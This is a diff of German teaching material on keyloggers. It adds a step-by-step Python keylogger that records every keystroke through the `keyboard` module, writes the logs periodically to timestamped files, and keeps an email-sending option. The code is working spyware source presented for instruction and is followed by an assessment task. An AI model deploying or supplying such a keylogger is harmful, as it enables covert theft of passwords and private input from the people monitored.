@@ -30,10 +30,10 @@ Bei Firmware-keyloggern wird die Software der Tastatur um eine schadhafte Kompon
 
 # Software Keylogger Beispiel in Python
 
-In dem Folgenden Beispiel wird gezeigt wie ein Keylogger in der Programmiersprache Python implementiert werden. Das erstellte Skript ist in der Lage die Tasteneinschläge des Nutzers zu registrieren und in eine globale `String` Variable zu speichern. In einem Periodischem Abstand wird der Inhalt dieser Variable per E-Mail verbreitet. 
+In dem Folgenden Beispiel wird gezeigt wie ein Keylogger in der Programmiersprache Python implementiert werden kann. Das erstellte Skript ist in der Lage die Tasteneinschläge des Nutzers zu registrieren und in einer globalen `String` Variable zu speichern. In einem Periodischem Abstand wird der Inhalt dieser Variable in einer Datei gespeichert.
 
 Um den Keylogger zu Implementieren wird das `keyboard` Modul benötigt. 
-Sämtliche Funktionalitäten des Keyloggers werden in einer Klasse implementiert. Die Klasse verfügt über ein `log` Attribut, in dem die aufgenommen Tastenschläge gespeichert werden und ein `intervall` Attribut, in dem Definiert wird, in welchen Abständen der Inhalt der String Variable geteilt wird. Zusätzlich kann bei der Objektinitialisierung noch angegeben werden wie die Informationen der `log` Variable geteilt werden, standardmäßig werden die Informationen durch E-Mails verbreitet,  siehe Konstruktor:
+Sämtliche Funktionalitäten des Keyloggers werden in einer Klasse implementiert. Die Klasse verfügt über ein `log` Attribut, in dem die aufgenommen Tastenschläge gespeichert werden und ein `intervall` Attribut, in dem Definiert wird, in welchen Abständen der Inhalt der String Variable geteilt wird. Zusätzlich kann bei der Objektinitialisierung noch angegeben werden wie die Informationen der `log` Variable geteilt werden, standardmäßig werden die Informationen durch E-Mails verbreitet, siehe Konstruktor, wird jedoch das Schlüsselwort `file` übergeben, so wird der Inhalt in eine Datei geschrieben.
 
 ```
 class Keylogger: 
@@ -80,7 +80,75 @@ def callback(self, event):
             self.log += name
 ```
 
-Nachdem 
+Nachdem die Tastatureinschläge in der `log` Variablen gespeichert wurden, müssen sie in eine lokale Datei geschrieben werden. Hierfür wurden die Methoden `update_filename(self)` und `report_to_file(self)` implementiert. Die erste Methode generiert einen Dateinamen, der sich auf den Beobachtungszeitraum bezieht. Die zweite Methode erzeugt eine Datei mit dem aus der `update_filename` Methode generierten Namen und speichert diese Datei in dem aktuellen Verzeichnis. 
+
+```
+ def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+```
+
+Innerhalb der `report(self)` Methode werden die beiden oberen Methoden in Periodischen Zeitintervallen aufgerufen und der Inhalt der `log` Variablen wird gelöscht. 
+
+
+```
+def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            # if you want to print in the console, uncomment below line
+            # print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
+```
+
+Für übersichtlicheren Code wird die `start(self)` Methode implementiert, die  außerhalb der Klasse aufgerufen werden kann und die `on_release()` Methode und `report()` Methode aufruft. 
+
+```
+def start(self):
+        # record the start datetime
+        self.start_dt = datetime.now()
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread, wait until CTRL+C is pressed
+        keyboard.wait()
+```
+
+Die Klasse ist funktionsfähig, nach der Objekt Initialisierung und dem Aufrufen der `start` Methode werden alle Tastatureinschläge aufgezeichnet und in periodischen Abständen in Textdateien geschrieben und lokal abgespeichert. 
+
+```
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
+```
 ## Bewertung 
 
 - **Skizzieren Sie ein Beispiel** anhand dessen Sie die folgenden Fragen beantworten und erklären Sie kurz warum Sie speziell dieses gewählt haben:
